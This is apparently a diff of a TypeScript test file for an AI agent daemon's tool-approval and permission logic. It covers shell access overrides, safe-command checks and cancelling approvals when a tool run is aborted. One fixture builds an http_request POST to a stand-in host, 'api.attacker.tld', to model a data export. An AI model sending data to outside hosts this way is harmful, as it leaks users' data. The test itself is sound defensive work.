@@ -174,6 +174,65 @@ describe("AgentDaemon.requestApproval auto-approve controls", () => {
     );
   });
 
+  it("evaluates task-level shell access against the effective workspace", () => {
+    const workspace = {
+      id: "workspace-temp",
+      name: "Temporary Workspace",
+      path: "/tmp/workspace",
+      permissions: {
+        read: true,
+        write: true,
+        delete: true,
+        network: true,
+        shell: false,
+      },
+      createdAt: Date.now(),
+    };
+    const daemonLike = Object.assign(Object.create(AgentDaemon.prototype), {
+      taskRepo: {
+        findById: vi.fn().mockReturnValue({
+          id: "task-shell-override",
+          workspaceId: workspace.id,
+          source: "manual",
+          status: "executing",
+          agentConfig: {
+            shellAccess: true,
+            permissionMode: "dont_ask",
+          },
+        }),
+      },
+      workspaceRepo: {
+        findById: vi.fn().mockReturnValue(workspace),
+      },
+      workspacePermissionRuleRepo: {
+        listByWorkspaceId: vi.fn().mockReturnValue([]),
+      },
+      getExecutorForTask: vi.fn().mockReturnValue(null),
+      logEvent: vi.fn(),
+    }) as Any;
+
+    const result = AgentDaemon.prototype.evaluateToolPermission.call(
+      daemonLike,
+      "task-shell-override",
+      {
+        approvalType: "run_command",
+        toolName: "run_command",
+        details: {
+          command: "pwd",
+          params: { command: "pwd" },
+        },
+      },
+    );
+
+    expect(result.decision).toBe("allow");
+    expect(result.reason).not.toEqual(
+      expect.objectContaining({
+        type: "workspace_capability",
+        capability: "shell",
+      }),
+    );
+  });
+
   it("keeps session approve-all behavior for safe network reads", async () => {
     const approvalRepo = {
       create: vi.fn().mockReturnValue({ id: "approval-1" }),
@@ -300,9 +359,13 @@ describe("AgentDaemon.requestApproval auto-approve controls", () => {
   });
 
   it("does not treat project test commands as auto-review safe shell commands", () => {
-    expect(AgentDaemon.prototype["isAutoReviewSafeCommand"].call({} as Any, "npm test")).toBe(false);
+    expect(AgentDaemon.prototype["isAutoReviewSafeCommand"].call({} as Any, "npm test")).toBe(
+      false,
+    );
     expect(AgentDaemon.prototype["isAutoReviewSafeCommand"].call({} as Any, "pytest")).toBe(false);
-    expect(AgentDaemon.prototype["isAutoReviewSafeCommand"].call({} as Any, "git status")).toBe(true);
+    expect(AgentDaemon.prototype["isAutoReviewSafeCommand"].call({} as Any, "git status")).toBe(
+      true,
+    );
   });
 
   it("disables auto-approve when allowAutoApprove=false is passed", async () => {
@@ -475,7 +538,10 @@ describe("AgentDaemon.requestApproval auto-approve controls", () => {
       "task-export",
       "data_export",
       "Approve export",
-      { tool: "http_request", params: { url: "https://api.attacker.tld", method: "POST", body: "x" } },
+      {
+        tool: "http_request",
+        params: { url: "https://api.attacker.tld", method: "POST", body: "x" },
+      },
     );
 
     expect(approvalRepo.create).toHaveBeenCalledWith(
@@ -630,6 +696,84 @@ describe("AgentDaemon.requestApproval auto-approve controls", () => {
     expect(daemonLike.pendingApprovals.size).toBe(0);
   });
 
+  it("invalidates a pending approval when the tool execution is aborted", async () => {
+    const approvalRepo = {
+      create: vi.fn().mockReturnValue({ id: "approval-aborted-tool" }),
+      update: vi.fn(),
+    };
+    const evaluatePermissionRequest = vi.fn().mockReturnValue({
+      evaluation: {
+        decision: "ask",
+        reason: { type: "mode", mode: "default", summary: "Prompt for this write." },
+      },
+      promptDetails: {
+        reason: { type: "mode", mode: "default", summary: "Prompt for this write." },
+        scopePreview: "write_file on path notes.md",
+        suggestedActions: [],
+      },
+      scope: { kind: "path", path: "notes.md", toolName: "write_file" },
+      trackingKey: "path:write_file:notes.md",
+      runtime: null,
+      workspace: undefined,
+    });
+    const logEvent = vi.fn();
+    const controller = new AbortController();
+    const task = { id: "task-aborted-tool", agentConfig: {} };
+    const daemonLike = {
+      sessionAutoApproveAll: false,
+      approvalRepo,
+      logEvent,
+      updateTask: vi.fn(),
+      evaluatePermissionRequest,
+      getTaskWithTransientAgentConfig: vi.fn((value) => value),
+      getEffectiveAccessProfile: vi.fn().mockReturnValue({
+        id: "ask",
+        requestedId: "ask",
+        sandboxMode: "workspace-write",
+        definition: {
+          approval: "ask",
+          reviewer: "manual",
+          network: "on-request",
+          domainRules: [],
+        },
+        adminConstrained: false,
+        profileUnavailable: false,
+        profileScoped: true,
+      }),
+      canSessionAutoApproveType: AgentDaemon.prototype["canSessionAutoApproveType"],
+      canAutoReviewApprove: vi.fn().mockReturnValue({ approved: false }),
+      taskRepo: { findById: vi.fn().mockReturnValue(task) },
+      pendingApprovals: new Map(),
+    } as Any;
+
+    const approvalPromise = AgentDaemon.prototype.requestApproval.call(
+      daemonLike,
+      task.id,
+      "workspace_write",
+      "Approve tool call: write_file",
+      { tool: "write_file", path: "notes.md" },
+      { signal: controller.signal },
+    );
+
+    expect(daemonLike.pendingApprovals.has("approval-aborted-tool")).toBe(true);
+    const rejection = expect(approvalPromise).rejects.toThrow(
+      "Approval request cancelled because tool execution ended",
+    );
+    controller.abort();
+    await rejection;
+
+    expect(daemonLike.pendingApprovals.size).toBe(0);
+    expect(approvalRepo.update).toHaveBeenCalledWith("approval-aborted-tool", "denied");
+    expect(logEvent).toHaveBeenCalledWith(
+      task.id,
+      "approval_denied",
+      expect.objectContaining({
+        approvalId: "approval-aborted-tool",
+        reason: "tool_execution_cancelled",
+      }),
+    );
+  });
+
   it("persists workspace approval rules and resolves the pending approval", async () => {
     const runtime = {
       recordPermissionSuccess: vi.fn(),
@@ -685,13 +829,15 @@ describe("AgentDaemon.requestApproval auto-approve controls", () => {
       persistApprovalActionRule: AgentDaemon.prototype["persistApprovalActionRule"],
     } as Any;
 
-    const manifestSpy = vi.spyOn(
-      await import("../../security/workspace-permission-manifest"),
-      "appendWorkspacePermissionManifestRule",
-    ).mockReturnValue({
-      success: true,
-      manifestPath: "/tmp/workspace-4/.cowork/policy/permissions.json",
-    });
+    const manifestSpy = vi
+      .spyOn(
+        await import("../../security/workspace-permission-manifest"),
+        "appendWorkspacePermissionManifestRule",
+      )
+      .mockReturnValue({
+        success: true,
+        manifestPath: "/tmp/workspace-4/.cowork/policy/permissions.json",
+      });
 
     const result = await AgentDaemon.prototype.respondToApproval.call(
       daemonLike,
@@ -723,7 +869,8 @@ describe("AgentDaemon.buildPermissionRules", () => {
 
   it("does not create legacy guardrail allow rules when trusted commands are disabled", async () => {
     const { GuardrailManager } = await import("../../guardrails/guardrail-manager");
-    const { PermissionSettingsManager } = await import("../../security/permission-settings-manager");
+    const { PermissionSettingsManager } =
+      await import("../../security/permission-settings-manager");
     const { BuiltinToolsSettingsManager } = await import("../tools/builtin-settings");
 
     vi.spyOn(GuardrailManager, "loadSettings").mockReturnValue({
@@ -755,7 +902,8 @@ describe("AgentDaemon.buildPermissionRules", () => {
 
   it("does not create blanket autonomy allow rules when autoApproveTypes is empty", async () => {
     const { GuardrailManager } = await import("../../guardrails/guardrail-manager");
-    const { PermissionSettingsManager } = await import("../../security/permission-settings-manager");
+    const { PermissionSettingsManager } =
+      await import("../../security/permission-settings-manager");
     const { BuiltinToolsSettingsManager } = await import("../tools/builtin-settings");
 
     vi.spyOn(GuardrailManager, "loadSettings").mockReturnValue({
